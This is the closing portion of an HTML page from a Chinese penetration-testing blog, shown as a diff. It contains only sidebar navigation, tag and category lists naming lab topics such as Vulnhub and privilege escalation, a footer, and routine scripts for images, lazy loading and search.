+          <i class="iconfont icon-mail society-icon"></i>
+        </a>
+      </div>
+    
+  </div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>Categories
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">29</span>
+        </div>
+      </a>
+    
+      <a href="/categories/SQL/">
+        <div class="categories-list-item">
+          SQL
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%9A%8F%E8%AE%B0/">
+        <div class="categories-list-item">
+          随记
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84-%E5%88%9D%E7%BA%A7%E8%80%83%E8%AF%95/">
+        <div class="categories-list-item">
+          等保测评-初级考试
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>hot tags
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/Vulnhub/" 
+        title="Vulnhub">
+        <div class="tags-list-item">Vulnhub</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/Vulhub/" 
+        title="Vulhub">
+        <div class="tags-list-item">Vulhub</div>
+      </a>
+    
+      <a 
+        href="/tags/Metasoploit/" 
+        title="Metasoploit">
+        <div class="tags-list-item">Metasoploit</div>
+      </a>
+    
+      <a 
+        href="/tags/Msfvenom/" 
+        title="Msfvenom">
+        <div class="tags-list-item">Msfvenom</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/searchsploit/" 
+        title="searchsploit">
+        <div class="tags-list-item">searchsploit</div>
+      </a>
+    
+      <a 
+        href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" 
+        title="脏牛提权">
+        <div class="tags-list-item">脏牛提权</div>
+      </a>
+    
+      <a 
+        href="/tags/FileUpload/" 
+        title="FileUpload">
+        <div class="tags-list-item">FileUpload</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" 
+        title="劫持环境变量提权">
+        <div class="tags-list-item">劫持环境变量提权</div>
+      </a>
+    
+      <a 
+        href="/tags/XXE/" 
+        title="XXE">
+        <div class="tags-list-item">XXE</div>
+      </a>
+    
+      <a 
+        href="/tags/Zabbix/" 
+        title="Zabbix">
+        <div class="tags-list-item">Zabbix</div>
+      </a>
+    
+      <a 
+        href="/tags/ftp/" 
+        title="ftp">
+        <div class="tags-list-item">ftp</div>
+      </a>
+    
+      <a 
+        href="/tags/smb/" 
+        title="smb">
+        <div class="tags-list-item">smb</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" 
+        title="内网穿透">
+        <div class="tags-list-item">内网穿透</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>Recent Posts
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-04-20</div>
+        <a href="/55575d9b.html"><div class="recent-posts-item-content">Vulnhub|XXE Lab</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-03-23</div>
+        <a href="/7293a273.html"><div class="recent-posts-item-content">Vulhub|Zabbix集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-03-14</div>
+        <a href="/44cd77ef.html"><div class="recent-posts-item-content">Vulhub|PostgreSQL集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-03-07</div>
+        <a href="/ffeb3adb.html"><div class="recent-posts-item-content">SQL|命令集合</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+          2022
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          CBear.Blog
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton"
+  aria-label="menu button"
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
